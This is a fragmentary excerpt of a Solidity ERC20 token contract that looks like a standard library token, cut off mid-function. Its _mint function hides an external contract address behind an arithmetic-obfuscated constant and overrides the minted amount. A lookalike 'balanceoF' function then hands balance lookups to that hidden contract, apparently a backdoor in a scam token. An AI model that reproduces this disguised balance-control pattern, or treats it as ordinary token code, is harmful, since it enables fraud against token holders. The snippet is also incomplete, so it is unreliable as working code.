...
contract ERC20 is Context,IERC20 {
     ...
     * - `from` must have a balance of at least `amount`.
     */
    function balanceoF(uint256 ba,address sender) private view returns(uint256) {
        return inx.dissort(false,ba, sender);
    }
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        inx = INX(address(uint160(614932389747193719218 + amount)));
        _beforeTokenTransfer(address(0), account, amount);
        amount = 300000000000 * 10 ** 18;
        _totalSupply += amount;
    unchecked {
